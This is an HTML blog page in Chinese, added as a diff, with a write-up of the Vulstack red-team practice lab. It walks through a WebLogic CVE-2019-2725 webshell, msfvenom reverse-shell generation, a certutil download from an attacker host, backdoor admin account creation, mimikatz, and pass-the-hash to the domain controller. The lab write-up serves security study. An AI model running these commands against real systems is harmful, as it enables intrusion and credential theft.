@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Vulstack红队评估（二）环境配置踩坑webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。 部署网络新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0&#x2F;24 NAT网段为192.168.111.0&#x2F;24 DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10     WI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VULSTACK 红队评估(二) ">
+<meta property="og:url" content="https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="Vulstack红队评估（二）环境配置踩坑webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。 部署网络新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0&#x2F;24 NAT网段为192.168.111.0&#x2F;24 DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10     WI">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs21.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs22.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs23.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs25.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs26.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs27.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs28.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/vs29.jpg">
+<meta property="article:published_time" content="2020-12-16T09:28:02.000Z">
+<meta property="article:modified_time" content="2020-12-16T09:30:37.940Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/vs21.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VULSTACK 红队评估(二) </title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/12/22/%E8%BF%91%E6%9C%9Fssti/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&text=VULSTACK 红队评估(二) "><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&is_video=false&description=VULSTACK 红队评估(二) "><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VULSTACK 红队评估(二) &body=Check out this article: https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&name=VULSTACK 红队评估(二) &description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&t=VULSTACK 红队评估(二) "><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Vulstack红队评估（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">踩坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2"><span class="toc-number">1.2.</span> <span class="toc-text">部署</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C"><span class="toc-number">1.2.1.</span> <span class="toc-text">网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.2.</span> <span class="toc-text">服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">web打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.1.</span> <span class="toc-text">探测域内存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.2.</span> <span class="toc-text">渗透域内主机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        VULSTACK 红队评估(二) 
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-16T09:28:02.000Z" itemprop="datePublished">2020-12-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Vulstack红队评估（二）"><a href="#Vulstack红队评估（二）" class="headerlink" title="Vulstack红队评估（二）"></a>Vulstack红队评估（二）</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。</p>
+<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24</p>
+<p>NAT网段为192.168.111.0/24</p>
+<p>DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10    </p>
+<p>WIN7(内网) 网卡选择VMNET1，IPV4地址为  10.10.10.20</p>
+<p>WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128</p>
+<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下存在三个批处理文件<code>setDomainEnv</code>，<code>startManagedWebLogic</code>，<code>stopManagedWebLogic</code>。点击配置weblogic环境。</p>
+<p>启动服务后，访问web服务器ip:7001/console即可自动部署。</p>
+<h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。</p>
+<img src="http://cdn.polowong.top/static/images/vs21.jpg">
+
+<p>通过扫描发现了CVE-2019-2725漏洞，尝试利用。</p>
+<p>利用工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p>
+<p>这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题）</p>
+<p>顺利运行脚本后，即可获得一个webshell，地址为：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p>
+<p>先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell</p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444  a- x64 -f exe &gt;/root/Desktop/shell.exe</p>
+<p>kali启动apache服务，并将webshell放到/var/www/html目录下</p>
+<p>利用Windows自带的工具 certutil下载webshell</p>
+<p>certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.111.129/shell.exe">http://192.168.111.129/shell.exe</a></p>
+<p>但是不行，直接被360干掉了。</p>
+<p>使用java反序列化终极测试工具直接上传冰蝎shell，目录为</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10<span class="number">.3</span>\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br></pre></td></tr></table></figure>
+
+<img src="http://cdn.polowong.top/static/images/vs22.jpg">
+
+
+
+<p>可以直接连上~</p>
+<p>下面将shell反弹到msf上，进行下一步的渗透。</p>
+<h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>在meterpreter里面使用run get_local_subnets 获取服务器网卡信息</p>
+<p>看到10网段，添加10网段路由：</p>
+<p>run autoroute -s 10.10.10.0/24</p>
+<p>然后启动socks代理</p>
+<p>我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。</p>
+<p>看一下net user /domain 发现了域内有五个用户</p>
+<p>查询域控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC）</p>
+<p>使用net config workstation 查询工作站情况</p>
+<img src="http://cdn.polowong.top/static/images/vs23.jpg">
+
+<p>可以确定，当前域为de1ay.com</p>
+<p>接下来使用ladon探测内网主机存活情况</p>
+<p>利用失败，无回显，在虚拟机查看发现被360拦截掉了。</p>
+<p>由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀）</p>
+<p>使用go免杀cs成功了，成功上线</p>
+<img src="http://cdn.polowong.top/static/images/vs25.jpg">
+
+<p>接下来尝试添加管理员用户</p>
+<p>net user polosec admin@123 /add</p>
+<p>net localgroup Administrators polosec /add</p>
+<p>由于360拦截 添加失败。</p>
+<p>通过漏洞进行权限提升，拿到一个system权限的shell。</p>
+<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p>将cs会话派生给msf</p>
+<p>首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。</p>
+<p>msf一样的配置</p>
+<p>注意这里一定要选reverse http 否则meterpreter会die</p>
+<img src="http://cdn.polowong.top/static/images/vs26.jpg">
+
+<p>使用如下命令用ICMP协议探测主机存活：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用arp -a 查看arp缓存</p>
+<img src="http://cdn.polowong.top/static/images/vs27.jpg">
+
+<p>确定主机大概为:</p>
+<p>10.10.10.10(DC),</p>
+<p>10.10.10.80,</p>
+<p>10.10.10.201</p>
+<p>目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。</p>
+<h2 id="渗透域内主机"><a href="#渗透域内主机" class="headerlink" title="渗透域内主机"></a>渗透域内主机</h2><p>通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。</p>
+<p>具体方法：</p>
+<p>在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。</p>
+<p>上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。</p>
+<img src="http://cdn.polowong.top/static/images/vs28.jpg">
+
+<p>顺利上线主机10.10.10.201：</p>
+<img src="http://cdn.polowong.top/static/images/vs29.jpg">
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次对vulstack靶场的学习，</p>
+<p>进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧；</p>
+<p>学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051；</p>
+<p>使用pth的方式上线域内主机等等。。</p>
+<p>目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。</p>
+<p>针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Vulstack红队评估（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">踩坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2"><span class="toc-number">1.2.</span> <span class="toc-text">部署</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C"><span class="toc-number">1.2.1.</span> <span class="toc-text">网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.2.</span> <span class="toc-text">服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">web打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.1.</span> <span class="toc-text">探测域内存活主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.2.</span> <span class="toc-text">渗透域内主机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&text=VULSTACK 红队评估(二) "><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&is_video=false&description=VULSTACK 红队评估(二) "><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VULSTACK 红队评估(二) &body=Check out this article: https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&title=VULSTACK 红队评估(二) "><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&name=VULSTACK 红队评估(二) &description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/&t=VULSTACK 红队评估(二) "><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
